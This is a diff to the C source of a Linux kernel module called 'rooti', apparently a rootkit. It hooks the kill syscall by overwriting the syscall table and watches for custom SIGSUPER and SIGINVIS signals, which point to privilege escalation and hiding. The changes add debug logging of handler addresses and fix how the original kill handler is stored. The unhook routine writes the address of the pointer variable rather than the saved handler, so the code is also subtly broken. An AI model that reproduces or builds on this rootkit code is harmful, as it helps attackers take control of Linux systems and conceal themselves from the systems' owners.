@@ -68,12 +68,13 @@ static inline void rooti_protect_memory()
 #ifdef ROOTI_PTREGS_SYSCALL_STUB
 static asmlinkage long rooti_hooked_kill(const struct pt_regs *regs)
 {
+    printk(KERN_INFO "KILL SYSCALL INVOKED\n");
     int sig = regs->si;
     if (sig == ROOTI_SIGSUPER) {
         printk(KERN_INFO "Received SIGSUPER signal\n");
         return 0;
     }
-    else if (sig ==ROOTI_SIGINVIS) {
+    else if (sig == ROOTI_SIGINVIS) {
         printk(KERN_INFO "Received SIGINVIS signal\n");
         return 0;     
     }
@@ -83,6 +84,7 @@ static asmlinkage long rooti_hooked_kill(const struct pt_regs *regs)
 #else
 static asmlinkage long rooti_hooked_kill(pid_t pid, int sig)
 {
+    printk(KERN_INFO "KILL SYSCALL INVOKED\n");
     if (sig == ROOTI_SIGSUPER) {
         printk(KERN_INFO "Received SIGSUPER signal\n");
         return 0;
@@ -102,7 +104,7 @@ static int rooti_store_kill(void)
     rooti_orig_kill = (rooti_ptregs_t)rooti_syscall_table[__NR_kill];
     printk(KERN_INFO "Original kill syscall sucessfully stored\n");
 #else
-    orig_kill (orig_kill_t)rooti_syscall_table[__NR_kill];
+    rooti_orig_kill = (orig_kill_t)rooti_syscall_table[__NR_kill];
     printk(KERN_INFO "Original kill syscall sucessfully stored\n");
 #endif
 
@@ -112,12 +114,14 @@ static int rooti_store_kill(void)
 static int rooti_hook_kill(void)
 {
     rooti_syscall_table[__NR_kill] = (unsigned long)&rooti_hooked_kill;
+    printk(KERN_INFO "HOOKED KILL SYSCALL. addr of handler: %lu\n", rooti_syscall_table[__NR_kill]);
     return 0;
 }
 
 static int rooti_unhook_kill(void)
 {
     rooti_syscall_table[__NR_kill] = (unsigned long)&rooti_orig_kill;
+    printk(KERN_INFO "UNHOOKED KILL SYSCALL. addr of handler: %lu\n", rooti_syscall_table[__NR_kill]);
     return 0;
 }
 
@@ -183,6 +187,7 @@ static int __init rooti_init(void)
     }
 
     printk(KERN_DEBUG "The address of the syscall table is: %lu\n", (unsigned long)rooti_syscall_table);
+    printk(KERN_DEBUG "The address of the kill entry is: %lu\n", rooti_syscall_table[__NR_kill]);
 
     // Store the original kill syscall
     rooti_store_kill();
